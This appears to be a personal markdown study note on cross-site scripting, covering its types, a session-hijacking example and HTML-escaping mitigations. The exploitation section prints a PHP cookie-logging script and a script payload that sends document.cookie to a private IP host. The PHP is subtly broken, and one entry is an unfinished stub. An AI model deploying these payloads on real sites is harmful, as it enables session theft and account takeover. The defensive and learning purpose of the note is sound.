# XSS

## Types
- Reflected
- Stored
- DOM Based
  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
    - source
      - ```?name=alireza => document.url()```
    - sink 
      -  ```getElementById()```
      - ```document.write()```


## Exploitation
- Session Hijacking
  - Cookie Stealer (PHP for Apache web server)
```PHP
<?php
$Cookie=$_GET[‘txt’];
$log=”Cookie=$cookie\r\n”;
$f=fopen(“log.txt”,”a”);
fwrite($f,$log);
?>
```
  - XSS Payload
```javascript
<script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
```

- Fake Page
  - g

- [BeEF](../Tools/beef.md)

## Mitigation
- Minimize the usage of user input on html
- Escape any untrusted input before inserting it into the page
  - ```&``` => ```&amp;```
  - ```<``` => ```&lt;```
  - ```>``` => ```&gt;```
  - ```"``` => ```&quot;```
  - ```'``` => ```&#x27;```
  - ```/``` => ```&#x2F;```
- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
